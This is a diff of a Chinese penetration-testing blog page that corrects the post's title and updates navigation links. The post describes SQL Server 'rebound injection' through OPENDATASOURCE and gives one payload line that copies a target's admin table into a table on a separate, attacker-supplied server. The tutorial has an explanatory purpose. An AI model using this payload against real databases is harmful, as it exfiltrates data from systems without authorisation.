@@ -7,20 +7,20 @@
   
   
   
-  <title>两数之和 | Crustsalt&#39;s Blog</title>
+  <title>SQLSever的反弹注入 | Crustsalt&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="SQLSever的反弹注入 主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
+  <meta name="description" content="主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="两数之和">
+<meta property="og:title" content="SQLSever的反弹注入">
 <meta property="og:url" content="http://yoursite.com/2019/10/14/sqlsever反弹注入/index.html">
 <meta property="og:site_name" content="Crustsalt&#39;s Blog">
-<meta property="og:description" content="SQLSever的反弹注入 主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
+<meta property="og:description" content="主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-10-18T15:03:34.568Z">
+<meta property="og:updated_time" content="2019-10-18T15:04:39.324Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="两数之和">
-<meta name="twitter:description" content="SQLSever的反弹注入 主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
+<meta name="twitter:title" content="SQLSever的反弹注入">
+<meta name="twitter:description" content="主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。 这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）">
   
     <link rel="alternative" href="/atom.xml" title="Crustsalt&#39;s Blog" type="application/atom+xml">
   
@@ -291,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      两数之和
+      SQLSever的反弹注入
     </h1>
   
 
@@ -313,8 +313,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>SQLSever的反弹注入</p>
-<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p>
+        <p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p>
 <p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into opendatasource(&apos;sqloledb&apos;,&apos;server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名&apos;).数据库名.dbo.数据库中的表名 select * from admin--</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>select * from admin –</p>
@@ -332,12 +331,12 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2019/10/14/sqlsever反弹注入/">两数之和</a></p>
+        <p><span>本文标题:</span><a  href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Crustsalt 的个人博客">Crustsalt</a></p>
         <p><span>发布时间:</span>2019年10月14日 - 23时08分</p>
-        <p><span>最后更新:</span>2019年10月18日 - 23时03分</p>
+        <p><span>最后更新:</span>2019年10月18日 - 23时04分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/10/14/sqlsever反弹注入/" title="两数之和">http://yoursite.com/2019/10/14/sqlsever反弹注入/</a>
+            <span>原始链接:</span><a class="post-url" href="/2019/10/14/sqlsever反弹注入/" title="SQLSever的反弹注入">http://yoursite.com/2019/10/14/sqlsever反弹注入/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/10/14/sqlsever反弹注入/　　作者: Crustsalt" title=""></span>
         </p>
         <p>
@@ -349,11 +348,11 @@
 
 <nav id="article-nav">
   
-    <a  href="/2019/10/14/整数反转/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2019/10/23/非递减数列/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          整数反转
+          非递减数列
         
       </div>
     </a>
@@ -445,7 +444,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2019/10/14/整数反转/" title="上一篇: 整数反转">
+            <a  href="/2019/10/23/非递减数列/" title="上一篇: 非递减数列">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -456,7 +455,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">两数之和</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/非递减数列/">非递减数列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li></ul>
     
 <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
